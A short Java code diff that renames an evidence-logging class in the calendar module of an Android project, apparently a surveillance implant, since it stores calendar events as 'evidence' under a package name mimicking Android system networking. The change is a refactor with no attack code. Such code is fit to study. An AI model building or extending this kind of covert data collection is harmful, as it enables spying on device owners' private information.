@@ -17,7 +17,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.crypto.Digest;
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
 import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
@@ -277,7 +277,7 @@ public class ModuleCalendar extends BaseModule {
 	 */
 	private void saveEvidenceCalendar(long idEvent, byte[] packet) {
 		// calendar.put(idEvent, Encryption.CRC32(packet));
-		final LogR log = new LogR(EvidenceType.CALENDAR);
+		final EvidenceReference log = new EvidenceReference(EvidenceType.CALENDAR);
 		log.write(packet);
 		log.close();
 
